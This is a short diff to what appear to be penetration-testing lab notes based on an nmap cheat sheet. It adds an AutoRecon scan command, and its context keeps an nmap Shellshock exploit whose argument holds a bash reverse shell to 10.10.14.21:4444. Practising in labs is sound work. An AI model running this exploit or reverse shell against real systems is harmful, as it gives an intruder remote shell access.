@@ -9,6 +9,7 @@ https://www.stationx.net/nmap-cheat-sheet/
 
 ```
 ```
+ python autorecon.py 192.168.29.136 -o 192.168.29.136-2nd --nmap "-p 18080,54445,40873,28022,27017"   
 sudo nmap -p80 -sV --script http-shellshock --script-args "uri=/cgi-bin/user.sh,cmd=bin/bash /bin/bash -i >& /dev/tcp/10.10.14.21/4444 0>&1" 10.129.1.175
 ```
 ```
